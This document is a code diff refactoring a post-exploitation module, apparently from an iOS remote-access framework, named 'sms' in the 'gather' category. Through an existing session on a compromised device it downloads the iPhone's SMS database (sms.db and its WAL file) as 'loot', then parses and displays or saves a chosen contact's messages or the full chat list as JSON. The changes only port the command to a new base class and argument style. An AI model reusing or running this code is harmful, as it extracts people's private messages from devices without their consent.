@@ -10,14 +10,12 @@ from seashell.lib.loot import Loot
 from pex.db import DB
 from pex.string import String
 
-from hatsploit.lib.command import Command
+from badges.cmd import Command
 
 
-class HatSploitCommand(Command):
+class ExternalCommand(Command, DB):
     def __init__(self):
-        super().__init__()
-
-        self.details = {
+        super().__init__({
             'Category': "gather",
             'Name': "sms",
             'Authors': [
@@ -26,14 +24,12 @@ class HatSploitCommand(Command):
             'Description': "View device SMS for a partner or save as json.",
             'Usage': "sms [-l|<partner>] [local_file]",
             'MinArgs': 1
-        }
-
-        self.db = DB()
+        })
 
         self.db_file = '/private/var/mobile/Library/SMS/sms.db'
         self.wal_file = '/private/var/mobile/Library/SMS/sms.db-wal'
 
-    def run(self, argc, argv):
+    def run(self, args):
         if not self.session.download(
                 self.db_file, Loot().specific_loot('sms.db')):
             return
@@ -42,22 +38,22 @@ class HatSploitCommand(Command):
                 self.wal_file, Loot().specific_loot('sms.db-wal')):
             return
 
-        if argv[1] == '-l':
+        if args[1] == '-l':
             self.print_process("Parsing SMS chats...")
 
             try:
-                chats = self.db.parse_sms_chats(
+                chats = self.parse_sms_chats(
                     Loot().specific_loot('sms.db'))
             except Exception:
                 self.print_error(f"Failed to parse SMS chats!")
                 return
 
-            if argc >= 3:
-                with open(argv[2], 'w') as f:
-                    self.print_process(f"Saving SMS chats to {argv[2]}...")
+            if len(args) >= 3:
+                with open(args[2], 'w') as f:
+                    self.print_process(f"Saving SMS chats to {args[2]}...")
                     json.dump(chats, f)
 
-                self.print_success(f"Saved SMS chats to {argv[2]}!")
+                self.print_success(f"Saved SMS chats to {args[2]}!")
                 return
 
             chats_data = []
@@ -74,21 +70,21 @@ class HatSploitCommand(Command):
 
             return
 
-        self.print_process(f"Parsing SMS for {argv[1]}...")
+        self.print_process(f"Parsing SMS for {args[1]}...")
 
         try:
-            sms = self.db.parse_sms_chat(
-                Loot().specific_loot('sms.db'), argv[1], imessage=False)
-        except Exception:
-            self.print_error(f"Failed to parse SMS for {argv[1]}!")
+            sms = self.parse_sms_chat(
+                Loot().specific_loot('sms.db'), args[1], imessage=False)
+        except Exception as e:
+            self.print_error(f"Failed to parse SMS for {args[1]}: {str(e)}!")
             return
 
-        if argc >= 3:
-            with open(argv[2], 'w') as f:
-                self.print_process(f"Saving SMS chat to {argv[2]}...")
+        if len(args) >= 3:
+            with open(args[2], 'w') as f:
+                self.print_process(f"Saving SMS chat to {args[2]}...")
                 json.dump(sms, f)
 
-            self.print_success(f"Saved SMS chat to {argv[2]}!")
+            self.print_success(f"Saved SMS chat to {args[2]}!")
             return
 
         sms_data = []
@@ -102,6 +98,6 @@ class HatSploitCommand(Command):
             ))
 
         if sms_data:
-            self.print_table(f"SMS ({argv[1]})", ('ID', 'Date', 'Status', 'Text'), *sms_data)
+            self.print_table(f"SMS ({args[1]})", ('ID', 'Date', 'Status', 'Text'), *sms_data)
         else:
-            self.print_warning(f"No SMS data available for {argv[1]}.")
+            self.print_warning(f"No SMS data available for {args[1]}.")
